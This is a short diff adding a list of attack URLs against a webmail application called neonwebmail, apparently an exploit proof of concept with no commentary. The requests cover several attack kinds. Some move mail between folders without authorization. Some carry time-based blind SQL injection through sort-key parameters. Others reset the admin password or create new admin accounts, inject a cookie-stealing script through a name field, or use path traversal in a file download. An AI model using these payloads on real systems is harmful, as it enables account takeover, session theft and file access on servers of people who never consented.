@@ -1,0 +1,16 @@
+
+http://www.example.com/neonwebmail/updatemail?ID=1&getpost=get&folderid=-1&tofolderid=-9&status=1&execute=move
+http://www.example.com/neonwebmail/updatemail?ID=1&getpost=get&folderid=-9&tofolderid=100&status=1&execute=move
+http://www.example.com/neonwebmail/addrlist?PAGE=1&sysid=0&adr_sortkey=rand(benchmark(1000000000000, sha1('123456781234567812345678')))&adr_sortkey_desc= ID, SELECT * FROM T_ADDR_BOOK WHERE ID = 'username' ORDER BYrand(benchmark(1000000000000,sha1('123456781234567812345678'))),SYSID DESC
+http://www.example.com/neonwebmail/maillist?getpost=get&PAGE=1&folderid=-1&sysid=0&sortkey=SENDER, rand(benchmark(1000000000000,sha1('123456781234567812345678')))&sortkey_desc=&sendkind=&searchlist=
+http://www.example.com/neonwebmail/updateuser?in_id=admin&in_pass=hacked&in_name=admin&in_admin=1&
+in_showmailcount=10&in_usecss=1&in_autopoptime=5&in_replysign=&in_isquotation=1&in_formwidth=50&exe=update
+http://www.example.com/neonwebmail/updateuser?in_id=guest&in_pass=guest&in_name=guest&in_admin=1&
+in_showmailcount=20&in_usecss=1&in_autopoptime=5&in_poppop=1&in_replysign=&in_formwidth=80&exe=update
+http://www.example.com/neonwebmail/updateuser?in_id=admin&exe=read
+http://www.example.com/neonwebmail/updateuser?in_id=super&in_pass=super&in_name=super&in_admin=1&
+in_showmailcount=10&in_usecss=1&in_autopoptime=5&in_replysign=&in_isquotation=1&in_formwidth=50&exe=insert
+http://www.example.com/neonwebmail/updateuser?in_id=admin&in_pass=hacked&
+in_name=<script>alert(document.cookie);</script>&in_admin=1&in_showmailcount=10&
+in_usecss=1&in_autopoptime=5&in_replysign=&in_isquotation=1&in_formwidth=50&exe=update
+http://www.example.com/neonwebmail/downloadfile?filename=filename.ext&savefolder=[traversal]&savefilename=[traversal]
